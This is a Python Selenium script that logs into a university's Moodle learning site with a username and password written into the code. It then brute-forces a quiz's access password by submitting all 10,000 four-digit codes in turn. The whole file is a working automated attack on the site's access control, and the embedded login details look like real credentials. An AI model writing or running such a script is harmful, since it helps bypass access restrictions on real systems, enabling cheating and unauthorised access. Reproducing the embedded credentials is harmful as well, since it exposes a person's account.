from selenium import webdriver
from selenium.webdriver.common.by import By
import time

myarray = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
number = 4


def myfunc(myarray, number):
    newarray = []
    for s1 in myarray:
        for s2 in myarray:
            for s3 in myarray:
                for s4 in myarray:
                    newarray.append(s1 + s2 + s3 + s4)
    return newarray


s = myfunc(myarray, number)

options = webdriver.ChromeOptions()
options.add_argument("user-agent=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0")
driver = webdriver.Chrome(
    executable_path="/home/cain/PycharmProject/selenium_python/chromedriver/chromedriver",
    options=options
)

driver.get("https://lms.mtuci.ru/lms/login/index.php")
time.sleep(1)
log = driver.find_element("id", "username")
log.clear()
log.send_keys('1bvt21167')
time.sleep(1)
pas = driver.find_element("id", "password")
pas.clear()
pas.send_keys('костяванлав1')
driver.find_element("id", "loginbtn").click()
time.sleep(1)

driver.get("https://lms.mtuci.ru/lms/mod/quiz/view.php?id=63151")
time.sleep(1)
driver.find_element(By.XPATH, '//button[text()="Начать тестирование"]').click()
time.sleep(1)

pas = driver.find_element("id", "id_quizpassword")
pas.clear()
pas.send_keys('0000')
driver.find_element("id", "id_submitbutton").click()
time.sleep(5)

for i in range(1, len(s)):
    pas = driver.find_element("id", "id_quizpassword")
    pas.clear()
    pas.send_keys(s[i])
    driver.find_element("id", "id_submitbutton").click()
    print(s[i])
